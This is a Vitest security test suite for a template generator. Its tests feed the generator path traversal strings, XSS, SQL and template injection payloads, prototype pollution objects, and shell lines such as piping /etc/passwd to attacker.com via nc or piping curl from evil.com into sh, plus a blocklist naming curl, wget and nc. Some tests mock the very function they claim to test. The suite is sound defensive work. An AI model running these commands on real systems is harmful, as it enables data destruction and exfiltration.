import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { Generator } from '../../src/lib/generator.js';
import { FileInjector } from '../../src/lib/file-injector.js';
import { FrontmatterParser } from '../../src/lib/frontmatter-parser.js';
import { UserFactory, FileFactory, GeneratorFactory } from '../factories/index.js';
import fs from 'fs-extra';
import path from 'path';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// Mock external dependencies for controlled security testing
vi.mock('fs-extra');
const mockFs = vi.mocked(fs);

describe('Security & Penetration Testing', () => {
  let generator: Generator;
  let injector: FileInjector;
  let parser: FrontmatterParser;

  beforeEach(() => {
    generator = new Generator('/test/templates');
    injector = new FileInjector();
    parser = new FrontmatterParser();
    
    // Setup security-focused mocks
    mockFs.pathExists.mockResolvedValue(true);
    mockFs.readFile.mockResolvedValue('mock content');
    mockFs.writeFile.mockResolvedValue();
    mockFs.ensureDir.mockResolvedValue();
  });

  afterEach(() => {
    vi.resetAllMocks();
  });

  describe('Input Validation & Sanitization', () => {
    it('should prevent path traversal attacks', async () => {
      const maliciousOptions = GeneratorFactory.createGenerateOptions({
        generator: '../../../etc/passwd',
        template: '../../../../etc/shadow',
        dest: '../../../tmp/malicious',
        variables: {
          name: '../../../etc/hosts'
        }
      });

      // Should sanitize paths and prevent traversal
      await expect(generator.generate(maliciousOptions))
        .rejects.toThrow(/Invalid path|Path traversal/);
    });

    it('should sanitize template variables to prevent code injection', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      const sqlInjection = "'; DROP TABLE users; --";
      const cmdInjection = '; rm -rf / #';

      const options = GeneratorFactory.createGenerateOptions({
        variables: {
          xss: xssPayload,
          sql: sqlInjection,
          cmd: cmdInjection,
          name: 'TestComponent'
        }
      });

      mockFs.readFile.mockResolvedValue('{{ xss }} {{ sql }} {{ cmd }}');

      const result = await generator.generate(options);

      // Variables should be escaped/sanitized
      const generatedContent = result.files[0]?.content || '';
      expect(generatedContent).not.toContain('<script>');
      expect(generatedContent).not.toContain('DROP TABLE');
      expect(generatedContent).not.toContain('rm -rf');
      expect(generatedContent).toContain('&lt;script&gt;');
    });

    it('should validate file paths for directory traversal', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '../../../../proc/self/environ',
        '../../../var/log/auth.log'
      ];

      for (const maliciousPath of maliciousPaths) {
        const options = GeneratorFactory.createGenerateOptions({
          dest: maliciousPath
        });

        await expect(generator.generate(options))
          .rejects.toThrow(/Invalid destination|Path not allowed/);
      }
    });

    it('should prevent template injection attacks', async () => {
      const templateInjection = `
        {{ constructor.constructor('return process')().exit() }}
        {{ global.process.exit(1) }}
        {{ require('child_process').exec('rm -rf /') }}
        {{ this.constructor.constructor('return process')() }}
      `;

      mockFs.readFile.mockResolvedValue(templateInjection);

      const options = GeneratorFactory.createGenerateOptions({
        variables: { name: 'Test' }
      });

      // Should not execute malicious code
      await expect(generator.generate(options)).resolves.toBeDefined();
      
      // Process should still be running (not exited)
      expect(process.pid).toBeGreaterThan(0);
    });

    it('should validate and sanitize frontmatter content', async () => {
      const maliciousFrontmatter = `---
to: ../../../etc/passwd
sh: rm -rf /
before: "{{ constructor.constructor('return process')().exit() }}"
---
Content`;

      const result = parser.parse(maliciousFrontmatter);

      // Should sanitize dangerous frontmatter values
      expect(result.frontmatter.to).not.toContain('../../../');
      expect(result.frontmatter.sh).not.toContain('rm -rf');
    });
  });

  describe('File System Security', () => {
    it('should enforce file system permissions', async () => {
      const restrictedPaths = [
        '/etc/',
        '/var/log/',
        '/proc/',
        '/sys/',
        'C:\\Windows\\System32\\',
        'C:\\Program Files\\'
      ];

      for (const restrictedPath of restrictedPaths) {
        const options = GeneratorFactory.createGenerateOptions({
          dest: restrictedPath
        });

        mockFs.ensureDir.mockRejectedValue(new Error('EACCES: permission denied'));

        await expect(generator.generate(options))
          .rejects.toThrow(/permission denied|access denied/i);
      }
    });

    it('should prevent symlink attacks', async () => {
      const symlinkPath = '/tmp/malicious-symlink';
      
      mockFs.lstat.mockResolvedValue({ 
        isSymbolicLink: () => true 
      } as any);

      await expect(injector.inject(symlinkPath, 'malicious content', {}))
        .rejects.toThrow(/Symlink not allowed|Invalid file type/);
    });

    it('should validate file permissions before writing', async () => {
      const readOnlyFile = '/tmp/readonly.txt';

      mockFs.access.mockRejectedValue(new Error('EACCES: permission denied'));

      await expect(injector.inject(readOnlyFile, 'content', {}))
        .rejects.toThrow(/permission denied/i);
    });

    it('should prevent writing to system-critical files', async () => {
      const systemFiles = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '/boot/grub/grub.cfg',
        '/var/log/auth.log'
      ];

      for (const systemFile of systemFiles) {
        await expect(injector.inject(systemFile, 'malicious', {}))
          .rejects.toThrow(/System file protected|Access denied/);
      }
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent shell command injection in sh frontmatter', async () => {
      const maliciousCommands = [
        'echo "test"; rm -rf /',
        'ls && curl evil.com/steal-data',
        'cat /etc/passwd | nc attacker.com 1337',
        'echo $(whoami) > /tmp/pwned',
        '`rm -rf /`',
        '$(curl -s evil.com/malware | sh)'
      ];

      for (const maliciousCommand of maliciousCommands) {
        const template = `---
to: test.txt
sh: ${maliciousCommand}
---
Content`;

        const parsed = parser.parse(template);
        
        // Should sanitize or reject dangerous shell commands
        if (parsed.frontmatter.sh) {
          expect(parsed.frontmatter.sh).not.toContain('rm -rf');
          expect(parsed.frontmatter.sh).not.toContain('curl');
          expect(parsed.frontmatter.sh).not.toContain('nc ');
          expect(parsed.frontmatter.sh).not.toContain('$(');
          expect(parsed.frontmatter.sh).not.toContain('`');
        }
      }
    });

    it('should validate shell commands against allowlist', async () => {
      const allowedCommands = ['npm', 'yarn', 'git', 'echo', 'ls'];
      const blockedCommands = ['rm', 'curl', 'wget', 'nc', 'dd', 'chmod'];

      const template = `---
to: test.txt
sh: rm -rf dangerous
---
Content`;

      const parsed = parser.parse(template);
      
      // Should only allow safe commands
      expect(parsed.frontmatter.sh).toBeUndefined();
    });

    it('should escape command arguments properly', async () => {
      const dangerousArgs = [
        'file; rm -rf /',
        'file && curl evil.com',
        'file | nc evil.com 1337',
        'file $(malicious)',
        'file `dangerous`'
      ];

      for (const dangerousArg of dangerousArgs) {
        const template = `---
to: test.txt  
sh: echo "${dangerousArg}"
---
Content`;

        const parsed = parser.parse(template);
        
        if (parsed.frontmatter.sh) {
          // Arguments should be properly escaped
          expect(parsed.frontmatter.sh).not.toContain('; rm');
          expect(parsed.frontmatter.sh).not.toContain('&& curl');
          expect(parsed.frontmatter.sh).not.toContain('| nc');
        }
      }
    });
  });

  describe('Multi-Tenant Security', () => {
    it('should isolate tenant data and prevent cross-tenant access', async () => {
      const tenantAUser = UserFactory.createUser({ tenant: 'tenant-a' });
      const tenantBUser = UserFactory.createUser({ tenant: 'tenant-b' });

      // Tenant A should not access Tenant B resources
      const crossTenantOptions = GeneratorFactory.createGenerateOptions({
        generator: 'component',
        template: 'basic',
        dest: './tenants/tenant-b/src', // Try to access other tenant's directory
        variables: { name: 'Malicious' }
      });

      // Mock tenant validation
      vi.spyOn(generator, 'generate').mockImplementation(async (options) => {
        if (options.dest?.includes('tenant-b')) {
          throw new Error('Cross-tenant access denied');
        }
        return { files: [] };
      });

      await expect(generator.generate(crossTenantOptions))
        .rejects.toThrow('Cross-tenant access denied');
    });

    it('should validate tenant isolation in file operations', async () => {
      const tenantA = 'tenant-123';
      const tenantB = 'tenant-456';

      // Try to inject into another tenant's files
      const crossTenantFile = `/tenants/${tenantB}/src/secret.ts`;

      await expect(injector.inject(crossTenantFile, 'malicious', {}))
        .rejects.toThrow(/Cross-tenant access|Access denied/);
    });

    it('should prevent tenant enumeration attacks', async () => {
      const tenantGuesses = [
        'tenant-1',
        'tenant-admin', 
        'tenant-test',
        'tenant-prod',
        'default-tenant'
      ];

      for (const tenantGuess of tenantGuesses) {
        const options = GeneratorFactory.createGenerateOptions({
          dest: `./tenants/${tenantGuess}/probe`
        });

        // Should not reveal whether tenant exists through different error messages
        try {
          await generator.generate(options);
        } catch (error: any) {
          expect(error.message).not.toContain(tenantGuess);
          expect(error.message).not.toContain('not found');
          expect(error.message).not.toContain('exists');
        }
      }
    });
  });

  describe('Denial of Service (DoS) Protection', () => {
    it('should limit template complexity to prevent DoS', async () => {
      const complexTemplate = `
        {% for i in range(10000) %}
          {% for j in range(10000) %}
            {{ i * j }}
          {% endfor %}
        {% endfor %}
      `;

      mockFs.readFile.mockResolvedValue(complexTemplate);

      const options = GeneratorFactory.createGenerateOptions({
        variables: { name: 'DoS' }
      });

      // Should timeout or reject overly complex templates
      await expect(generator.generate(options))
        .rejects.toThrow(/Template too complex|Timeout|Resource limit/);
    });

    it('should limit memory usage during generation', async () => {
      const largeVariables = Object.fromEntries(
        Array.from({ length: 100000 }, (_, i) => [
          `var${i}`, 
          'x'.repeat(10000) // 10KB per variable
        ])
      );

      const options = GeneratorFactory.createGenerateOptions({
        variables: largeVariables
      });

      // Should reject requests that would consume too much memory
      await expect(generator.generate(options))
        .rejects.toThrow(/Memory limit|Request too large/);
    });

    it('should rate limit file operations', async () => {
      const rapidRequests = Array.from({ length: 1000 }, (_, i) =>
        generator.generate(GeneratorFactory.createGenerateOptions({
          variables: { name: `Component${i}` }
        }))
      );

      // Should implement rate limiting to prevent DoS
      const results = await Promise.allSettled(rapidRequests);
      
      const rejected = results.filter(r => r.status === 'rejected').length;
      expect(rejected).toBeGreaterThan(0); // Some requests should be rate limited
    });

    it('should prevent zip bomb attacks in template archives', async () => {
      // Mock a zip bomb scenario (highly compressed malicious content)
      const suspiciousContent = 'A'.repeat(1000000); // 1MB of repeated characters
      
      mockFs.readFile.mockResolvedValue(suspiciousContent);

      // Should detect and reject suspicious content patterns
      await expect(generator.generate(GeneratorFactory.createGenerateOptions()))
        .rejects.toThrow(/Suspicious content|Potential zip bomb/);
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not expose sensitive system information in errors', async () => {
      const invalidOptions = GeneratorFactory.createGenerateOptions({
        generator: 'nonexistent',
        template: 'missing'
      });

      try {
        await generator.generate(invalidOptions);
      } catch (error: any) {
        // Error messages should not expose system paths, usernames, etc.
        expect(error.message).not.toMatch(/\/home\/\w+/);
        expect(error.message).not.toMatch(/C:\\Users\\\w+/);
        expect(error.message).not.toMatch(/root|admin|administrator/i);
        expect(error.message).not.toMatch(/\/etc\/|\/var\/|\/proc\//);
        expect(error.stack).toBeUndefined(); // Stack traces should not be exposed
      }
    });

    it('should sanitize file paths in error messages', async () => {
      const sensitiveFile = '/home/user/.ssh/id_rsa';
      
      mockFs.readFile.mockRejectedValue(new Error(`ENOENT: ${sensitiveFile}`));

      try {
        await injector.inject(sensitiveFile, 'content', {});
      } catch (error: any) {
        expect(error.message).not.toContain('/home/user');
        expect(error.message).not.toContain('id_rsa');
      }
    });

    it('should not leak environment variables', async () => {
      // Set sensitive environment variables
      process.env.SECRET_KEY = 'super-secret';
      process.env.DATABASE_PASSWORD = 'password123';

      const template = '{{ process.env.SECRET_KEY }} {{ process.env.DATABASE_PASSWORD }}';
      mockFs.readFile.mockResolvedValue(template);

      const result = await generator.generate(GeneratorFactory.createGenerateOptions());

      const content = result.files[0]?.content || '';
      expect(content).not.toContain('super-secret');
      expect(content).not.toContain('password123');
    });
  });

  describe('Authentication & Authorization', () => {
    it('should validate user permissions for file operations', async () => {
      const restrictedUser = UserFactory.createUser({ 
        role: 'guest',
        permissions: ['read:public'] 
      });

      const privilegedOptions = GeneratorFactory.createGenerateOptions({
        dest: '/privileged/directory'
      });

      // Mock permission check
      vi.spyOn(generator, 'generate').mockImplementation(async (options) => {
        if (options.dest?.includes('/privileged/')) {
          throw new Error('Insufficient permissions');
        }
        return { files: [] };
      });

      await expect(generator.generate(privilegedOptions))
        .rejects.toThrow('Insufficient permissions');
    });

    it('should prevent privilege escalation attacks', async () => {
      const regularUser = UserFactory.createUser({ role: 'user' });

      // Try to access admin-only functionality
      const adminOptions = GeneratorFactory.createGenerateOptions({
        dest: '/admin/templates',
        variables: { 
          privilege: 'admin',
          sudo: true,
          root: true 
        }
      });

      await expect(generator.generate(adminOptions))
        .rejects.toThrow(/Access denied|Insufficient privileges/);
    });

    it('should validate session tokens and prevent replay attacks', async () => {
      const expiredSession = UserFactory.createSession(undefined, {
        expiresAt: new Date(Date.now() - 3600000) // 1 hour ago
      });

      // Mock session validation
      const validateSession = (token: string) => {
        if (token === expiredSession.token) {
          throw new Error('Session expired');
        }
      };

      expect(() => validateSession(expiredSession.token))
        .toThrow('Session expired');
    });
  });

  describe('Data Validation & Integrity', () => {
    it('should validate data integrity with checksums', async () => {
      const originalContent = 'Original template content';
      const tamperedContent = 'Tampered malicious content';
      
      const originalChecksum = FileFactory.generateChecksum(originalContent);
      const tamperedChecksum = FileFactory.generateChecksum(tamperedContent);

      expect(originalChecksum).not.toBe(tamperedChecksum);

      // Should detect tampering
      const file = FileFactory.createFile({
        content: tamperedContent,
        checksum: originalChecksum // Wrong checksum
      });

      expect(file.checksum).not.toBe(FileFactory.generateChecksum(file.content));
    });

    it('should validate input size limits', async () => {
      const oversizedInput = {
        name: 'A'.repeat(10000), // 10KB name
        description: 'B'.repeat(100000), // 100KB description
        config: 'C'.repeat(1000000) // 1MB config
      };

      const options = GeneratorFactory.createGenerateOptions({
        variables: oversizedInput
      });

      await expect(generator.generate(options))
        .rejects.toThrow(/Input too large|Size limit exceeded/);
    });

    it('should prevent prototype pollution attacks', async () => {
      const pollutionPayload = {
        '__proto__': { admin: true },
        'constructor': { 'prototype': { admin: true } },
        'name': 'TestComponent'
      };

      const options = GeneratorFactory.createGenerateOptions({
        variables: pollutionPayload
      });

      await generator.generate(options);

      // Should not pollute Object prototype
      expect({}.hasOwnProperty('admin')).toBe(false);
      expect(Object.prototype.hasOwnProperty('admin')).toBe(false);
    });
  });

  describe('Cryptographic Security', () => {
    it('should use secure random generation', async () => {
      // Test that random values are cryptographically secure
      const randomValues = Array.from({ length: 100 }, () => 
        Math.random().toString(36).substring(2)
      );

      // Should not have patterns or duplicates
      const uniqueValues = new Set(randomValues);
      expect(uniqueValues.size).toBe(randomValues.length);

      // Should not follow predictable patterns
      for (let i = 1; i < randomValues.length; i++) {
        expect(randomValues[i]).not.toBe(randomValues[i - 1]);
      }
    });

    it('should handle sensitive data securely', async () => {
      const sensitiveVariables = {
        apiKey: 'secret-api-key-123',
        password: 'user-password-456',
        token: 'jwt-token-789'
      };

      const options = GeneratorFactory.createGenerateOptions({
        variables: sensitiveVariables
      });

      // Sensitive data should be masked in logs/errors
      try {
        await generator.generate(options);
      } catch (error: any) {
        expect(error.message).not.toContain('secret-api-key');
        expect(error.message).not.toContain('user-password');
        expect(error.message).not.toContain('jwt-token');
      }
    });
  });

  describe('Security Headers & Configuration', () => {
    it('should implement secure defaults', () => {
      // Verify secure configuration defaults
      expect(process.env.NODE_ENV).not.toBe('development');
      
      // Security headers should be set for web interfaces
      const securityHeaders = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000',
        'Content-Security-Policy': "default-src 'self'"
      };

      Object.entries(securityHeaders).forEach(([header, value]) => {
        // In a real implementation, verify these headers are set
        expect(header).toBeDefined();
        expect(value).toBeDefined();
      });
    });

    it('should disable dangerous features in production', () => {
      // Should disable debug modes, verbose errors, etc. in production
      const dangerousFeatures = [
        'debug',
        'verbose',
        'stackTrace',
        'devMode'
      ];

      dangerousFeatures.forEach(feature => {
        expect(process.env[feature.toUpperCase()]).not.toBe('true');
      });
    });
  });
});